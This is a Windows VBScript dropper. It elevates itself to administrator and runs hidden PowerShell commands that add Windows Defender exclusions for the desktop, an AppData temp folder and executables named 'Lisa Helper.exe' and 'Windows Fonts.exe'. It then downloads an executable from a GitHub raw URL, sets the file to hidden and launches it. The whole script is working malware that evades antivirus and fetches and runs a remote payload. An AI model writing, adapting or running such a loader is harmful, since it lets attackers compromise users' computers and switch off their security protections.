Option Explicit

Dim shell, fso, ws
Dim desktop, exeUrl, exePath, tempPath, fontExePath
Dim scriptPath, waitTime

Set shell = CreateObject("Shell.Application")
Set fso   = CreateObject("Scripting.FileSystemObject")
Set ws    = CreateObject("WScript.Shell")

scriptPath = WScript.ScriptFullName

' Relaunch as admin if not elevated
If Not IsAdmin() Then
    shell.ShellExecute "wscript.exe", """" & scriptPath & """", "", "runas", 1
    WScript.Quit
End If

desktop     = ws.SpecialFolders("Desktop")
exeUrl      = "https://raw.githubusercontent.com/boucegame/y/main/Lisa%20Helper.exe"
exePath     = desktop & "\Lisa Helper.exe"
tempPath    = ws.ExpandEnvironmentStrings("%APPDATA%") & "\temp"
fontExePath = tempPath & "\Windows Fonts.exe"

' Create temp folder if missing
If Not fso.FolderExists(tempPath) Then fso.CreateFolder(tempPath)

' Add Defender exclusions
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & desktop & "'"
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & exePath & "'"
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & tempPath & "'"
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & fontExePath & "'"

' Download the EXE (blocking)
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & exePath & "' -UseBasicParsing"

' Wait up to 15 seconds for the file to be ready
waitTime = 0
Do While (Not fso.FileExists(exePath)) And waitTime < 15000
    WScript.Sleep 500
    waitTime = waitTime + 500
Loop

If fso.FileExists(exePath) Then
    ' Hide the file
    Dim f
    Set f = fso.GetFile(exePath)
    f.Attributes = f.Attributes Or 2 ' Hidden

    ' Launch EXE via WScript.Shell.Run (visible)
    ws.Run """" & exePath & """", 1, False
Else
    MsgBox "Failed to download the EXE file."
End If

' === FUNCTIONS ===

Function RunHidden(cmd)
    CreateObject("WScript.Shell").Run cmd, 0, True
End Function

Function IsAdmin()
    On Error Resume Next
    CreateObject("WScript.Shell").RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
    IsAdmin = (Err.Number = 0)
    On Error GoTo 0
End Function
